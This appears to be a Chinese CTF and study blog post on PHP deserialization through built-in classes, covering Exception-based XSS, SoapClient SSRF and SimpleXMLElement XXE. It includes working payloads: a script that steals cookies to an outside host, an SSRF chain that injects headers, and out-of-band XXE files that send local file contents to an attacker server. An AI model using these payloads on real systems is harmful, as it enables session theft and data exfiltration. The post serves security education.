---
title: PHP反序列化&原生内置&Exception类&SoapClient类&SimpleXMLElement
published: 2026-07-13T12:00:00
description: PHP反序列化中原生类的利用链：Exception触发XSS、SoapClient触发SSRF、SimpleXMLElement触发XXE，涵盖利用条件、POP链构造及CTF实战案例（BJDCTF、SUCTF），理解无危险类时的攻击手法。
tags:
  - 反序列化
  - PHP
  - Web攻防
  - 原生类
category: 网络安全
draft: false
---

# 知识点

1. WEB攻防-PHP反序列化-原生类&生成及利用条件
2. WEB攻防-PHP反序列化-Exception触发XSS
3. WEB攻防-PHP反序列化-SoapClient触发SSRF
4. WEB攻防-PHP反序列化-SimpleXMLElement触发XXE

```php
<?php  
class Demo1{  
    public $cmd = '';  
  
    public function __destruct()  
    {  
        system($this->cmd);  
    }  
}  
echo serialize(new Demo1());
```

从以上代码,分析反序列化漏洞的前提条件:

1、可控变量 

2、反序列化函数 

3、调用的对象类 

4、对象类中包含魔术方法 

5、魔术方法中有命令执行函数

这五个条件缺一不可,在php语言中有一些内置原生类其实就能满足3,4,5这三个条件

原生类的出现就是为了解决这个问题，当**遇到无类可用或者有类无危险方法的时候**就可以尝试使用**原生类来进行反序列化攻击。**

# 原生自带类参考

https://xz.aliyun.com/news/8792

https://www.anquanke.com/post/id/264823

https://blog.csdn.net/cjdgg/article/details/115314651

# 利用条件

1、**有触发魔术方法**

2、**魔术方法有利用类**

3、**部分自带类拓展开启**

# 生成原生类

```php
<?php
$classes = get_declared_classes();
foreach ($classes as $class) {
    $methods = get_class_methods($class);
    foreach ($methods as $method) {
        if (in_array($method, array(
			'__construct',
            '__destruct',
            '__toString',
            '__wakeup',
            '__call',
            '__callStatic',
            '__get',
            '__set',
            '__isset',
            '__unset',
            '__invoke',
            '__set_state'
        ))) {
            print $class . '::' . $method . "\n";
        }
    }
}
```

# 使用Error/Exception类进行XSS

Error/Exception：处理异常错误信息并输出

```php
<?php  
$test = unserialize($_GET['xss']);
echo $test;
```

POC链：

```php
// 赋值一个xss语句,序列化这个xss语句并对其进行url编码
$a = new Exception("<script>alert('xss')</script>");
echo urlencode(serialize($a));
```

通过打印原生类结果发现

```
Exception::__construct
Exception::__wakeup
Exception::__toString
```

再回到代码解析：

```php
<?php  
$test = unserialize($_GET['xss']);  // 无法直接触发xss,因为这里被反序列化
echo $test; // 试图将反序列化后的结果当作字符串输出
```

当Payload（序列化后的 Exception）被服务器接收并反序列化成$test对象后

紧接着执行`echo $test;`

PHP 发现“这里需要一个字符串，但你给了一个对象”，于是**自动调用**该对象的 `__toString()` 方法，把里面的 `<script>` 弹窗放行。

漏洞利用过程:

- 输出对象可调用__toString

- 无代码通过原生类Exception

- Exception使用查询编写利用

- 通过访问触发输出产生XSS漏洞

# `[BJDCTF 2nd]`xss之光

发现为`.git`泄露,使用githack将源码下载发现

index.php

```php
$a = $_GET['yds_is_so_beautiful'];
echo unserialize($a);
```

还是当对象被当作字符串调用时，会触发`__toString()`

POP链：

```php
<?php
// flag藏在cookie
$poc = new Exception("<script>window.open('http://462795d3-ea59-4f00-9657-d50f15178248.node5.buuoj.cn:81/?'+document.cookie);</script>");
echo urlencode(serialize($poc));
?>
```

# 使用SoapClient类进行SSRF

```php
<?php
$s = unserialize($_GET['ssrf']);
$s->a();
?>
```

POP链：

```php
$a = new SoapClient(null, array('location' => 'http://47.103.27.133:2222/xxx', 'uri' => 'http://47.103.27.133:2222'));  
$b = serialize($a);  
echo $b;
```

通过打印原生类结果发现：

如果没有结果回显，就去当前使用的php版本中的ini文件，找到`;extension=soap`，并去掉注释

```
SoapClient::__call
```

漏洞利用过程：

- 输出对象可调用__call

- 无代码通过原生类SoapClient

- SoapClient使用查询编写利用

- 通过访问触发服务器SSRF漏洞

# CTFSHOW-259

题目前置代码flag.php：

代码中可以看出，要求两个条件：

1、ip要等于127.0.0.1

2、以post提交token值要等于ctfshow

```php
// flag.php  
$xff = explode(',',$_SERVER['HTTP_X_FORWARDED_FOR']);  
array_pop($xff);  
$ip = array_pop($xff);  
  
if($ip!=='127.0.0.1'){  
    die('error');  
}else{  
    $token = $_POST['token'];  
    if ($token!=='ctfshow'){  
        file_put_contents('flag.txt',$flag);  
    }  
}
```

靶场代码：

```php
highlight_file(__FILE__);  
  
$vip = unserialize($_GET['vip']);  
// vip can get flag one key  
$vip->getflag();
```

POP链：

```php
<?php
$ua="aaa\r\nX-Forwarded-For:127.0.0.1,127.0.0.1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\n\r\ntoken=ctfshow";
$client=new SoapClient(null,array('uri'=>'http://127.0.0.1/','location'=>'http://127.0.0.1/flag.php','user_agent'=>$ua));
echo urlencode(serialize($client));
?>
```

之后会生成一个flag.txt，访问`靶场地址/flag.txt`

漏洞利用过程：

- 不存在的方法触发__call

- 无代码通过原生类SoapClient

- SoapClient使用查询编写利用

- 通过访问本地Flag.php获取Flag

# 使用SimpleXMLElement类进行xxe

攻击者服务器放三个文件

oob.xml：

调用

```
<?xml version="1.0"?>  
<!DOCTYPE ANY[  
        <!ENTITY % remote SYSTEM "http://ip/send.xml">  
        %remote;  
        %all;  
        %send;  
        ]>
```

send.xml：

读取test.php并赋值给send.php

```
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=test.php">  
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://xxx/send.php?file=%file;'>">
```

send.php：

接收内容并保存为result.txt，这里拿到的内容需要进行Base64解码

```php
<?php  
file_put_contents("result.txt", $_GET['file']);
```

POP链：

```php
<?php
$sxe=new SimpleXMLElement('http://外网地址/oob.xml',2,true);// 具体参数可以查看SimpleXMLElement的函数调用
$a = serialize($sxe);
echo $a;
?>
```

通过打印原生类发现：

```
SimpleXMLElement::__construct
SimpleXMLElement::__toString
```

漏洞利用过程：

- 不存在的方法触发__construct

- 无代码通过原生类SimpleXMLElement

- SimpleXMLElement使用查询编写利用

# `[SUCTF 2018]`Homework

利用点：SimpleXMLElement(url,2,true)

靶场代码：

```php
<?php  
class calc  
{  
    function __construct()  
    {  
        calc();  
    }  
  
    function calc($args1,$method,$args2)  
    {  
        $args1 = intval($args1);  
        $args2 = intval($args2);  
        switch ($method) {  
            case 'a':  
                $method = "+";  
                break;  
            case 'b':  
                $method = "-";  
                break;  
            case 'c':  
                $method = "*";  
                break;  
            case 'd':  
                $method = "/";  
                break;  
  
            default:  
                die("invalid input");  
        }  
        $Expression = $args1.$method.$args2;  
        eval("\$r=$Expression;");  
        die("Calculation results:".$r);  
    }  
}
```

oob.xml:

```
<?xml version="1.0"?>
<!DOCTYPE ANY[
		<!ENTITY % remote SYSTEM "http://ip/send.xml">
		%remote;
		%all;
		%send;
		]>
```

send.xml:

```
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=show.php">
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://ip/send.php?file=%file;'>">
```

send.php:

```php
<?php
file_put_contents("result.txt", $_GET['file']);
```

Poc：

根据SimpleXMLElement类进行xxe的POP链

```
/show.php?module=SimpleXMLElement&args[]=http://120.27.152.29/oob.xml&args[]=2&args[]=true
SimpleXMLElement为自带类
第一个值为触发oob.xml点
第二个值为2，启用外部实体解析
第三个值为true，外网访问开关
```

 **`$dataIsURL = true`**：PHP 去请求 `http://120.27.152.29/oob.xml`，获取远端 XML 内容。

**`$options = 2 (LIBXML_NOENT)`**：PHP 解析这个 XML 时，**允许加载外部 DTD 实体**。

 `oob.xml` 里面写了恶意 DTD，那么在解析时，PHP 会再s次向外发起请求（带外攻击，OOB），从而造成 XXE 漏洞。